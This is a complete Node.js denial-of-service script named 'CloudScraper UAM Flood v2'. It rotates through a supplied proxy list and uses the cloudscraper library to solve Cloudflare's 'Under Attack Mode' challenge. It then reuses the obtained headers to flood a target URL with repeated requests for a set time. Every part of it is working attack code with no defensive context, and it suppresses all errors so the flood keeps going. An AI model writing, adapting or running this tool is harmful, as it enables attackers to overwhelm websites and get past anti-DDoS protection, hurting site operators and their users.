#!/usr/bin/env node
/* CloudScraper UAM Flood v2 */

require('events').EventEmitter.defaultMaxListeners = 0;

const fs = require('fs');
const CloudScraper = require('cloudscraper');
const path = require('path');

const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
const reqPerIp = parseInt(process.argv[4]) || 10;
const proxiesFilePath = process.argv[5];

if (!target || !proxiesFilePath) {
    console.log(`Usage: node ${path.basename(__filename)} <url> <time> <req_per_ip> <proxies.txt>`);
    process.exit(0);
}

let proxies = fs.readFileSync(proxiesFilePath, 'utf-8')
    .replace(/\r/gi, '')
    .split('\n')
    .filter(Boolean);

// Fisher-Yates shuffle
for (let i = proxies.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [proxies[i], proxies[j]] = [proxies[j], proxies[i]];
}

let index = 0;

function sendRequest() {
    const proxy = proxies[index];
    index = (index + 1) % proxies.length;
    
    CloudScraper({
        uri: target,
        resolveWithFullResponse: true,
        proxy: 'http://' + proxy,
        challengesToSolve: 10
    }, (error, response) => {
        if (error || !response) return;
        
        for (let i = 0; i < reqPerIp; i++) {
            CloudScraper({
                uri: target,
                headers: response.request.headers,
                proxy: 'http://' + proxy,
                followAllRedirects: false
            }, () => {});
        }
    });
}

function startAttack() {
    setInterval(sendRequest, 100);
    setTimeout(() => {
        console.log('[+] Attack ended.');
        process.exit(0);
    }, time * 1000);
}

startAttack();

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
